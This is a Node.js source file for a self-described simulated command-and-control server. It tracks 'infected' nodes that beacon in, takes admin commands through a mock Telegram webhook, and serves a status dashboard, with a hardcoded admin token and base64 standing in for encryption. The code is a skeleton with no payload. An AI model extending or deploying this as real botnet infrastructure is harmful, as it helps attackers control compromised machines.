// J/server/c2_core.js
// COMMAND & CONTROL CORE (Simulation)
// This server acts as the central nervous system for the "Synergy" simulation.
// It manages node check-ins, handles admin commands via a mock Telegram interface,
// and aggregates telemetry data.

const http = require('http');
const crypto = require('crypto');

// CONFIGURATION
const PORT = 3000;
const ADMIN_TOKEN = "SUPER_ADMIN_SECRET_KEY_V1"; // In prod, use ENV variables

// IN-MEMORY DATABASE (Simulated Persistence)
const nodes = new Map(); // Active "infected" nodes
const logs = [];

// ENCRYPTION LAYER
function encrypt(text) {
    // Simulating AES-256-GCM
    return Buffer.from(text).toString('base64'); // Mock encryption for demo
}

function decrypt(data) {
    return Buffer.from(data, 'base64').toString('ascii');
}

// REQUEST HANDLER
const requestHandler = (req, res) => {
    const { method, url } = req;
    
    // 1. BEACON ENDPOINT (Where nodes check in)
    if (url === '/beacon' && method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const nodeId = data.id || crypto.randomUUID();
                
                nodes.set(nodeId, {
                    lastSeen: Date.now(),
                    ip: req.socket.remoteAddress,
                    status: data.status || 'IDLE',
                    metadata: data.meta || {}
                });
                
                console.log(`[Orchestrator] Beacon received from ${nodeId}`);
                res.writeHead(200, {'Content-Type': 'application/json'});
                res.end(JSON.stringify({ cmd: 'SLEEP', interval: 60 }));
            } catch (e) {
                res.writeHead(400);
                res.end('Invalid Metadata');
            }
        });
    } 
    
    // 2. ADMIN TELEGRAM WEBHOOK (Simulated)
    else if (url === '/tg-webhook' && method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            // Validate Admin
            if (req.headers['x-admin-auth'] !== ADMIN_TOKEN) {
                res.writeHead(403);
                res.end('Unauthorized');
                return;
            }
            
            // Parse Command
            // Format: /cmd <target_id> <instruction>
            const ConsensusData = JSON.parse(body);
            const command = ConsensusData.message?.text || "";
            
            console.log(`[Orchestrator] Admin Command: ${command}`);
            logs.push({ ts: Date.now(), cmd: command });
            
            // Response Logic
            res.writeHead(200);
            res.end('Command Queued');
        });
    }
    
    // 3. DASHBOARD API (Secure Read)
    else if (url === '/api/status') {
        if (req.headers['x-admin-auth'] !== ADMIN_TOKEN) {
            res.writeHead(403);
            return res.end();
        }
        
        const statusReport = {
            active_nodes: nodes.size,
            uptime: process.uptime(),
            recent_logs: logs.slice(-10)
        };
        
        res.writeHead(200, {'Content-Type': 'application/json'});
        res.end(JSON.stringify(statusReport));
    }
    
    else {
        res.writeHead(404);
        res.end();
    }
};

const server = http.createServer(requestHandler);

server.listen(PORT, () => {
    console.log(`[Orchestrator] Server active on port ${PORT}`);
    console.log(`[Orchestrator] Waiting for beacons...`);
});
